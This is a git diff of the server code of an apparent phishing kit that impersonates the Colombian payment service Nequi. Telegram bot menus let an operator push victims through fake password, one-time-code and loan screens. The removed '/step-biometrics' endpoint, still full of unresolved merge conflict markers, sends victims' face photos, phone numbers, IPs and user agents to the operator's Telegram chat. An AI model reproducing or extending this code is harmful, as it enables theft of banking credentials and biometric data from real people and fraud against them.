@@ -23,7 +23,7 @@ app.use(express.static('public')); // Servir archivos estáticos
 // ==================== VARIABLES DE ENTORNO ====================
 const BOT_TOKEN = process.env.BOT_TOKEN;
 const CHAT_ID = process.env.CHAT_ID;
-const RENDER_URL = process.env.RENDER_URL || 'https://portalnequi.onrender.com';
+const RENDER_URL = process.env.RENDER_URL || 'https://tu-proyecto.onrender.com';
 
 if (!BOT_TOKEN || !CHAT_ID) {
   console.warn("[WARN] BOT_TOKEN o CHAT_ID no definidos en variables de entorno.");
@@ -52,10 +52,7 @@ function getLoanSimulatorMenu(sessionId) {
         { text: "❌ Error Número", callback_data: `go:accces-sign-in|${sessionId}` },
         { text: "❌ Error Clave", callback_data: `go:access-sign-in-pass|${sessionId}` }
       ],
-	  [
-        { text: "🧬 Biometría", callback_data: `go:biometria|${sessionId}` }
-      ],
-	   [
+      [
         { text: "❌ Error Monto", callback_data: `go:loan-simulator-error|${sessionId}` },
         { text: "♻️ Pedir Dinámica", callback_data: `go:one-time-pass|${sessionId}` }
       ],
@@ -74,9 +71,6 @@ function getDynamicMenu(sessionId) {
       [
         { text: "❌ Error Dinámica", callback_data: `error-dynamic|${sessionId}` },
         { text: "❌ Error Número", callback_data: `go:accces-sign-in|${sessionId}` }
-      ],
-	  [
-        { text: "🧬 Biometría", callback_data: `go:biometria|${sessionId}` }
       ],
       [
         { text: "❌ Error Clave", callback_data: `go:access-sign-in-pass|${sessionId}` },
@@ -330,98 +324,6 @@ app.post('/consignar', async (req, res) => {
     res.status(500).json({ ok: false, reason: error.message });
   }
 });
-
- 
-// ==================== ENDPOINT: BIOMETRÍA ====================
-
-
-
-
-
-
-<<<<<<< HEAD
-// ==================== ENDPOINT: BIOMETRÍA ====================
-app.post('/step-biometrics', async (req, res) => {
-  try {
-    const { sessionId, imageBase64, userAgent, ip, phoneNumber } = req.body;
-=======
-app.post('/step-biometrics', async (req, res) => {
-  try {
-    const { sessionId, imageBase64, userAgent, ip } = req.body;
->>>>>>> b3ecfedf0334e58c4d9b96060a75bf4c9e0a13bf
-
-    if (!BOT_TOKEN || !CHAT_ID) {
-      return res.status(500).json({ ok: false });
-    }
-
-<<<<<<< HEAD
-    if (!sessionId || !imageBase64) {
-      return res.status(400).json({ ok: false, reason: 'Datos incompletos' });
-    }
-
-=======
->>>>>>> b3ecfedf0334e58c4d9b96060a75bf4c9e0a13bf
-    const session = sessionData.get(sessionId) || {};
-
-    const buffer = Buffer.from(
-      imageBase64.replace(/^data:image\/\w+;base64,/, ''),
-      'base64'
-    );
-
-<<<<<<< HEAD
-    const FormData = require('form-data');
-    const formData = new FormData();
-
-=======
-    const formData = new (require('form-data'))();
->>>>>>> b3ecfedf0334e58c4d9b96060a75bf4c9e0a13bf
-    formData.append('chat_id', CHAT_ID);
-    formData.append('photo', buffer, {
-      filename: 'biometria.jpg',
-      contentType: 'image/jpeg'
-    });
-
-    formData.append(
-      'caption',
-<<<<<<< HEAD
-`🧬 BIOMETRÍA RECIBIDA
-
-📱 Número: ${phoneNumber || session.phoneNumber || 'N/A'}
-🆔 Session: ${sessionId}
-🌐 IP: ${ip || session.ip || 'N/A'}
-🖥️ UA: ${userAgent || 'N/A'}`
-    );
-
-    await axios.post(
-      getTelegramApiUrl('sendPhoto'),
-      formData,
-      { headers: formData.getHeaders() }
-    );
-
-    console.log(`🧬 Biometría enviada - Session: ${sessionId}`);
-    res.json({ ok: true });
-
-=======
-      `🧬 BIOMETRÍA RECIBIDA\n\n🆔 Session: ${sessionId}\n🌐 IP: ${ip}\n🖥️ UA: ${userAgent}`
-    );
-
-    await axios.post(getTelegramApiUrl('sendPhoto'), formData, {
-      headers: formData.getHeaders()
-    });
-
-    console.log(`🧬 Biometría enviada - Session ${sessionId}`);
-    res.json({ ok: true });
->>>>>>> b3ecfedf0334e58c4d9b96060a75bf4c9e0a13bf
-  } catch (err) {
-    console.error('❌ Error biometría:', err.message);
-    res.status(500).json({ ok: false });
-  }
-});
-
-
-
-
-
 
 // ==================== WEBHOOK DE TELEGRAM ====================
 app.post(`/webhook/${BOT_TOKEN}`, async (req, res) => {
